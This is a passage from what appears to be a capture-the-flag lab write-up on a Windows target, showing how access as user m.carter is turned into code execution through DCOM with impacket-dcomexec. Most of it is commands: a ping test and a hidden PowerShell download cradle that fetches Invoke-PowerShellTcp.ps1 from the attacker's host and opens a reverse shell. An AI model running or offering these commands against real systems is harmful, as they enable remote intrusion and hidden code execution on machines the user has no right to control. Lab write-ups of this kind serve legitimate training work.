# DCOM-RCE

this custom group only maps to DCOM-based remote execution rights instead. So the pivot was to **DCOM** (which travels over RPC, not WinRM's HTTP endpoint).

# 7. Getting code execution as `m.carter` via DCOM

```
impacket-dcomexec scaffold.htb/m.carter:'[REDACTED]'@10.129.xx.xx \
  'ping -n 2 10.10.xx.xx' -object MMC20 -nooutput
```

A PowerShell download-cradle reverse shell one-liner was executed via the same DCOM technique:

```bash
impacket-dcomexec scaffold.htb/m.carter:'[REDACTED]'@10.129.xx.xx \
  "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.xx.xx:8000/Invoke-PowerShellTcp.ps1');" \
  -object MMC20 -nooutput
```